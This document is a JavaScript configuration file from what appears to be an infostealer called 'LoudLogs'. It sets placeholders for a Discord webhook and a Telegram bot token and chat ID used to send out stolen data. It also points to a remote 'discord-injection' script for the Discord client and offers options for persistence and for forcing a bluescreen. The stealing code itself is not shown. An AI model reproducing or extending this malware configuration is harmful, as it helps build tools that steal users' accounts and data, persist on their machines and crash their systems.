const {randomChar, randomInt} = require("../functions/utils/random")

/**
 * Global configuration object.
 * Replace the placeholders before using.
 */

const config = {
  /** Discord webhook URL */
  wbk: "%WEBHOOK%",

  /** Telegram bot token */
  token: "%TELEGRAM_BOTTOKEN%",

  /** Telegram chat ID */
  chatId: "%TELEGRAM_CHATID%",

  /** Telegram API URL to send messages */
  tlg: "https://api.telegram.org/bot%TELEGRAM_BOTTOKEN%/sendMessage?chat_id=%TELEGRAM_CHATID%",

  /** Discord injection script URL */
  discordInject: "https://raw.githubusercontent.com/wompless/discord-injection/main/injection.js",

  /** Persist option */
  Persist: "%PERSIST?%",

  /** Trigger system bluescreen? */
  bluescreen: "%BLUESCREEN?%",
  
  /** TempDirs & tempFiles */
  identifier: `LoudLogs_${randomChar(4)}-${randomChar(4)}-${randomChar(4)}-${randomChar(4)}`,
  rdm: `LoudLogs_${randomInt(10)}`
};

module.exports = config;
